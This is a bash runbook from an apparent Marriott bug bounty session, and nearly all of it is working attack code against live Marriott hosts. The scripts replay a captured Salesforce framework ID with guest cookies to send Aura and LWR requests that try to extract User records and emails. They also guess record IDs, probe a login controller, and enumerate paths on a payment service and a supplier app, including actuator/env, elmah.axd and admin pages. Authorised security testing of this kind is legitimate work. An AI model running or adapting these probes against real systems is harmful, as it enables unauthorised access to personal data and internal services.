# Session 8 Runbook — Marriott Bug Bounty
# Goal: LWC wire endpoint probe + real fwuid Aura tests + psp.marriott.com
# Date: 2026-06-22
# Prerequisite: Session 7 ran — real fwuid is extracted, LWC endpoints confirmed live

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin

BB="${BB:-$HOME/bug-bounty-hunting-}"
OUTDIR="$BB/results/marriott/session8"
mkdir -p "$OUTDIR"
exec > >(tee "$OUTDIR/session8-output.txt") 2>&1

echo "=== SESSION 8 START: $(date) ==="

# Real fwuid extracted from Session 7 D9
REAL_FWUID="cmpKNldRZXRSMkdjemxQdjBkbl9uQWtVMjdnTGFERUU2S3FfSVdrcU92bkExNC4xOTIuODM4ODYwOA"

# Capture fresh guest session cookies
curl -skLc /tmp/cpp-s8-cookies.txt "https://cpp.marriott.com/s/" -o /dev/null
echo "Session cookies:"
cat /tmp/cpp-s8-cookies.txt 2>/dev/null | grep -v '^#' | grep -v '^$'

# Aura helper using REAL fwuid
aura_real() {
  local descriptor="$1"
  local params="$2"
  curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b /tmp/cpp-s8-cookies.txt \
    --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"${descriptor}\",\"callingDescriptor\":\"UNKNOWN\",\"params\":${params}}]}" \
    --data-urlencode "{\"mode\":\"PROD\",\"fwuid\":\"${REAL_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
    --data-urlencode 'aura.pageURI=/s/' \
    --data-urlencode 'aura.token=undefined'
}

parse_aura() {
  python3 -c "
import sys, json
raw = sys.stdin.read()
print(f'size={len(raw)}B')
try:
    obj = json.loads(raw[raw.index('{'):])
    for a in obj.get('actions', []):
        state = a.get('state', '?')
        rv = a.get('returnValue')
        err = a.get('error')
        print(f'state={state}')
        if rv:
            if isinstance(rv, dict):
                keys = list(rv.keys())[:10]
                print(f'returnValue keys: {keys}')
                fields = rv.get('fields', {})
                if fields: print(f'  field_count={len(fields)}')
                records = rv.get('records', rv.get('items', []))
                if isinstance(records, list) and records:
                    print(f'  RECORDS: {len(records)}')
                    for r in records[:2]: print(f'    {json.dumps(r)[:300]}')
            elif isinstance(rv, list):
                print(f'returnValue list len={len(rv)}')
                for r in rv[:2]: print(f'  {json.dumps(r)[:300]}')
        if err:
            msg = err[0].get('message','') if isinstance(err, list) and err else str(err)
            print(f'error: {msg[:300]}')
except Exception as e:
    print(f'parse error: {e}')
    print(raw[:400])
" 2>&1
}

# ============================================================
# PHASE A — LWC WIRE ENDPOINTS (new surface, Session 7 discovery)
# Target: cpp.marriott.com/s/sfsites/lwr/
# These endpoints use the Lightning Web Runtime protocol (newer than Aura)
# ============================================================
echo ""
echo "===== PHASE A: LWC WIRE ENDPOINTS ====="

# A1: Fetch LWR root — see what the 1368B response contains
echo "--- A1: GET /s/sfsites/lwr/ (1368B) ---"
curl -sk -b /tmp/cpp-s8-cookies.txt "https://cpp.marriott.com/s/sfsites/lwr/" \
  | python3 -c "
import sys, json
d = sys.stdin.read()
print(f'size={len(d)}B')
try:
    obj = json.loads(d)
    print('JSON keys:', list(obj.keys()) if isinstance(obj, dict) else 'list')
    print(json.dumps(obj, indent=2)[:800])
except:
    print('not JSON — raw content:')
    print(d[:500])
"

# A2: Fetch LWR fetch endpoint — see what the 1383B response contains
echo "--- A2: GET /s/sfsites/lwr/fetch (1383B) ---"
curl -sk -b /tmp/cpp-s8-cookies.txt "https://cpp.marriott.com/s/sfsites/lwr/fetch" \
  | python3 -c "
import sys, json
d = sys.stdin.read()
print(f'size={len(d)}B')
try:
    obj = json.loads(d)
    print('JSON keys:', list(obj.keys()) if isinstance(obj, dict) else type(obj).__name__)
    print(json.dumps(obj, indent=2)[:800])
except:
    print(d[:500])
"

# A3: POST to LWR fetch with Aura-format message (test if it processes Aura actions)
echo "--- A3: POST /s/sfsites/lwr/fetch with Aura message ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/lwr/fetch" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s8-cookies.txt \
  --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"aura://RecordUiController/ACTION\$getObjectInfo\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"objectApiName\":\"User\"}}]}" \
  --data-urlencode "{\"mode\":\"PROD\",\"fwuid\":\"${REAL_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
print(f'size={len(d)}B')
try:
    obj = json.loads(d[d.index('{'):])
    for a in obj.get('actions', []):
        print('state:', a.get('state'))
        rv = a.get('returnValue', {})
        if rv: print('fields:', len(rv.get('fields', {})))
except: print(d[:400])
"

# A4: POST LWR with JSON wire adapter format (getRecord)
echo "--- A4: POST /s/sfsites/lwr/fetch with wire adapter format ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/lwr/fetch" \
  -H "Content-Type: application/json" \
  -b /tmp/cpp-s8-cookies.txt \
  -d '{"type":"getRecord","params":{"recordId":"0050000000000001AAA","fields":["User.Id","User.Email","User.Name","User.FirstName"]}}' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
print(f'size={len(d)}B')
try:
    print(json.dumps(json.loads(d), indent=2)[:800])
except: print(d[:400])
"

# A5: POST LWR with wire adapter format (list view)
echo "--- A5: POST /s/sfsites/lwr/fetch with getListUi wire format ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/lwr/fetch" \
  -H "Content-Type: application/json" \
  -b /tmp/cpp-s8-cookies.txt \
  -d '{"type":"getListUi","params":{"objectApiName":"User","listViewApiName":"AllUsers","pageSize":5}}' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
print(f'size={len(d)}B')
try:
    print(json.dumps(json.loads(d), indent=2)[:800])
except: print(d[:400])
"

# A6: Try LWR subpaths for wire adapters
echo "--- A6: LWR subpath enumeration ---"
for LWR_PATH in \
  "s/sfsites/lwr/" \
  "s/sfsites/lwr/fetch" \
  "s/sfsites/lwr/getRecord" \
  "s/sfsites/lwr/getListUi" \
  "s/sfsites/lwr/getObjectInfo" \
  "s/sfsites/lwr/ui-record-api" \
  "s/sfsites/lwr/ui-list-api" \
  "s/sfsites/lwr/api" \
  "sfsites/lwr/fetch"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -b /tmp/cpp-s8-cookies.txt \
    "https://cpp.marriott.com/${LWR_PATH}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" -b /tmp/cpp-s8-cookies.txt \
    "https://cpp.marriott.com/${LWR_PATH}")
  echo "${LWR_PATH}: $CODE / ${SIZE}B"
done

# ============================================================
# PHASE B — AURA WITH REAL FWUID (eliminates framework mismatch)
# Previous sessions used fwuid="NOT_FOUND" → state=warning (framework issue)
# Now using REAL fwuid extracted from Session 7
# ============================================================
echo ""
echo "===== PHASE B: AURA WITH REAL FWUID ====="

# B1: Baseline — confirm getObjectInfo still succeeds with real fwuid
echo "--- B1: getObjectInfo(User) with real fwuid (baseline) ---"
aura_real \
  "aura://RecordUiController/ACTION\$getObjectInfo" \
  '{"objectApiName":"User"}' | parse_aura
# EXPECT: state=SUCCESS, field_count=203 (same as before — confirms fwuid working)

# B2: getItems with real fwuid — the key test
# Session 7 got "state=warning" with fwuid=NOT_FOUND
# With real fwuid, the framework is valid → should get real response
echo "--- B2: getItems(User) with real fwuid ---"
aura_real \
  "serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION\$getItems" \
  '{"entityNameOrId":"User","layoutType":"COMPACT","pageSize":25,"currentPage":0}' | parse_aura
# If state=SUCCESS + records → HIGH FINDING
# If state=ERROR "access denied" → Guest profile correctly blocks records (expected)
# If state=ERROR "internal server error" → code bug, not permission block

# B3: getListUi with real fwuid
echo "--- B3: getListUi(User, AllUsers) with real fwuid ---"
aura_real \
  "aura://RecordUiController/ACTION\$getListUi" \
  '{"objectApiName":"User","listViewApiName":"AllUsers","pageSize":5,"pageToken":null,"fields":["User.Id","User.Email","User.Name"],"optionalFields":[],"sortBy":null,"updateMru":false}' | parse_aura

# B4: searchRecords with real fwuid
echo "--- B4: searchRecords(User, q=a) with real fwuid ---"
aura_real \
  "aura://RecordUiController/ACTION\$searchRecords" \
  '{"q":"a","objectApiName":"User","fields":["User.Id","User.Name","User.Email","User.FirstName"],"optionalFields":[],"pageSize":5}' | parse_aura

# B5: getCurrentUserOrGuest with real fwuid
echo "--- B5: getCurrentUserOrGuest with real fwuid ---"
aura_real \
  "aura://UserController/ACTION\$getCurrentUserOrGuest" \
  '{}' | parse_aura
# May return guest user object with Id, name, isGuest=true

# B6: getRecord with real fwuid (try to enumerate valid User IDs)
# If B5 returns a guest user ID, use that. Otherwise try org-pattern IDs.
echo "--- B6: getRecord with User IDs + real fwuid ---"
for SFID in "0050000000000001AAA" "0050000000000002AAA" "0053000000000001AAA" "0058000000000001AAA"; do
  RESP=$(aura_real \
    "aura://RecordUiController/ACTION\$getRecord" \
    "{\"recordId\":\"${SFID}\",\"fields\":[\"User.Id\",\"User.Email\",\"User.Name\",\"User.FirstName\"],\"optionalFields\":[]}")
  STATE=$(echo "$RESP" | python3 -c "
import sys,json
d=sys.stdin.read()
try:
    obj=json.loads(d[d.index('{'):])
    for a in obj.get('actions',[]):
        rv=a.get('returnValue',{})
        fields=rv.get('record',{}).get('fields',{}) if rv else {}
        print(a.get('state','?'), '| fields:', len(fields))
except: print(len(d),'B unparsed')
" 2>/dev/null)
  echo "getRecord(${SFID}): ${STATE}"
done

# B7: CommLoginController with real fwuid — parse full response body
echo "--- B7: CommLoginController login (real fwuid) ---"
aura_real \
  "apex://CommLoginController/ACTION\$login" \
  '{"username":"nonexistent_999_zzz_test@invalid-example-xyz.com","password":"INVALID_PW_TEST_12345!","startUrl":""}' \
  | parse_aura

# ============================================================
# PHASE C — DIRECT SALESFORCE ORG ACCESS
# Org instance identified: usa850.sfdc-8tgtt5
# Try direct REST API access at the Salesforce pod URL
# ============================================================
echo ""
echo "===== PHASE C: DIRECT SALESFORCE ORG ACCESS ====="

# C1: Try usa850 instance REST API versions (public endpoint)
echo "--- C1: usa850.salesforce.com REST API ---"
curl -sk -o /dev/null -w "usa850.salesforce.com: %{http_code} / %{size_download}B\n" \
  "https://usa850.salesforce.com/services/data/"
curl -sk "https://usa850.salesforce.com/services/data/" \
  | python3 -c "import sys,json; d=sys.stdin.read(); print(json.dumps(json.loads(d),indent=2)[:500])" 2>/dev/null \
  || echo "(not JSON or empty)"

# C2: Try with cpp.marriott.com cookies on the pod URL
echo "--- C2: usa850 with community cookies ---"
curl -sk \
  -b /tmp/cpp-s8-cookies.txt \
  "https://usa850.salesforce.com/services/data/v55.0/sobjects/User/describe" \
  -w "HTTP %{http_code} / %{size_download}B\n" -o /tmp/c2-result.json
python3 -c "
import json
d = open('/tmp/c2-result.json').read()
print(f'size={len(d)}B')
try:
    obj = json.loads(d)
    print('keys:', list(obj.keys())[:10])
    print(json.dumps(obj, indent=2)[:400])
except: print(d[:300])
"

# C3: Guess the Community My Domain URL (Salesforce Experience Cloud sites have a custom domain)
# cpp.marriott.com IS the community URL already, but try the underlying org domain
echo "--- C3: Community SOQL endpoint with fwuid context ---"
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cpp-s8-cookies.txt \
  --data-urlencode "message={\"actions\":[{\"id\":\"1;a\",\"descriptor\":\"aura://RecordUiController/ACTION\$getObjectInfo\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"objectApiName\":\"User\"}}]}" \
  --data-urlencode "{\"mode\":\"PROD\",\"fwuid\":\"${REAL_FWUID}\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":true}" \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  -o /tmp/c3-result.json -w "HTTP %{http_code} / %{size_download}B\n"
python3 -c "
import json, re
d = open('/tmp/c3-result.json').read()
print(f'size={len(d)}B')
try:
    obj = json.loads(d[d.index('{'):])
    for a in obj.get('actions', []):
        state = a.get('state','?')
        rv = a.get('returnValue',{})
        fields = rv.get('fields',{}) if rv else {}
        print(f'state={state} | fields={len(fields)}')
        # If we got a new fwuid in response, extract it
        new_fwuid = re.findall(r'\"fwuid\"\s*:\s*\"([^\"]+)\"', d)
        if new_fwuid: print(f'fwuid in response: {new_fwuid[0][:40]}...')
except Exception as e: print('error:', e, d[:200])
"

# ============================================================
# PHASE D — PSP.MARRIOTT.COM (payment service — 0 prior reports)
# If Phase E output from Session 7 showed interesting endpoints, test them here
# Otherwise, do a comprehensive endpoint probe now
# ============================================================
echo ""
echo "===== PHASE D: PSP.MARRIOTT.COM PAYMENT SERVICE ====="

# D1: Full header fingerprint
echo "--- D1: psp.marriott.com headers ---"
curl -skI "https://psp.marriott.com/" | head -20
curl -sk -o /dev/null -w "Root: HTTP %{http_code} / %{size_download}B / type=%{content_type}\n" \
  "https://psp.marriott.com/"

# D2: API endpoint enumeration
echo "--- D2: psp.marriott.com endpoint enum ---"
for EP in \
  api api/v1 api/v2 api/v3 \
  payments payments/list transactions \
  webhooks webhook hooks \
  health status ping alive ready \
  swagger swagger-ui.html swagger-ui/ openapi.json \
  v2/api-docs v3/api-docs api-docs api/swagger.json \
  actuator actuator/health actuator/env actuator/mappings actuator/beans \
  .well-known/openid-configuration \
  oauth token authorize login \
  admin internal metrics trace \
  graphql; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://psp.marriott.com/${EP}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" "https://psp.marriott.com/${EP}")
  if [ "$CODE" = "200" ] || [ "$CODE" = "301" ] || [ "$CODE" = "302" ] || [ "$CODE" = "401" ] || [ "$CODE" = "403" ]; then
    echo "*** psp/${EP}: $CODE / ${SIZE}B"
  fi
done

# D3: PSP content analysis — what does the 4853B root page look like?
echo "--- D3: psp.marriott.com root page analysis ---"
curl -sk "https://psp.marriott.com/" \
  | python3 -c "
import sys, re
html = sys.stdin.read()
print(f'size={len(html)}B')
# Framework detection
if 'react' in html.lower(): print('Framework: React')
if 'angular' in html.lower(): print('Framework: Angular')
if 'vue' in html.lower(): print('Framework: Vue')
if 'struts' in html.lower(): print('Framework: Struts')
if 'spring' in html.lower(): print('Framework: Spring')
if 'laravel' in html.lower(): print('Framework: Laravel')
# API paths in page
paths = re.findall(r'[\"\'](/(?:api|v[0-9]|graphql|rest|service)[^\"\' ]{0,80})', html)
if paths: print('API paths:', paths[:10])
# URLs and scripts
scripts = re.findall(r'src=[\"\'](https?://[^\"\']+)', html)
if scripts: print('External scripts:', scripts[:5])
# Title and meta
title = re.search(r'<title>([^<]+)</title>', html, re.I)
if title: print('Title:', title.group(1))
print('First 500B:')
print(html[:500])
"

# D4: PSP with common paths from prior Marriott payment research
echo "--- D4: PSP specialized paths ---"
for EP in \
  "pay" "checkout" "payment-form" "secure" \
  "psp" "mpi" "3ds" "3dsecure" \
  "callback" "notify" "ipn" "return" \
  "admin/login" "merchant" "merchants" \
  "api/payment" "api/merchant" "api/checkout"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://psp.marriott.com/${EP}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" "https://psp.marriott.com/${EP}")
  if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
    echo "psp/${EP}: $CODE / ${SIZE}B"
  fi
done

# ============================================================
# PHASE E — ESUPPLIER.MARRIOTT.COM TARGETED PROBE
# 200/54985B — largest live app in recon, raw EC2, no WAF
# ASP.NET confirmed. Previous probes: generic 404s on all paths.
# New approach: try ASP.NET-specific paths
# ============================================================
echo ""
echo "===== PHASE E: ESUPPLIER TARGETED ====="

# E1: ASP.NET specific paths
echo "--- E1: esupplier ASP.NET paths ---"
for EP in \
  "Login.aspx" "Default.aspx" "Home.aspx" "Index.aspx" \
  "admin/" "Admin/" "administration/" \
  "api/" "api/v1/" "webapi/" \
  "elmah.axd" "trace.axd" "ScriptResource.axd" \
  "WebResource.axd" "BundleConfig" \
  "swagger" "swagger/ui/index" \
  "hangfire" "hangfire/jobs" \
  ".well-known/openid-configuration" \
  "health" "health/live" "health/ready" \
  "_api/" "_layouts/" "rest/"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://esupplier.marriott.com/${EP}")
  SIZE=$(curl -sk -o /dev/null -w "%{size_download}" "https://esupplier.marriott.com/${EP}")
  if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
    echo "esupplier/${EP}: $CODE / ${SIZE}B"
  fi
done

# E2: esupplier headers + tech fingerprint
echo "--- E2: esupplier headers ---"
curl -skI "https://esupplier.marriott.com/" | grep -iE "server|x-powered|x-aspnet|x-frame|content-type|location|set-cookie"

echo ""
echo "=== SESSION 8 COMPLETE: $(date) ==="
echo "=== Output saved to $OUTDIR/session8-output.txt ==="
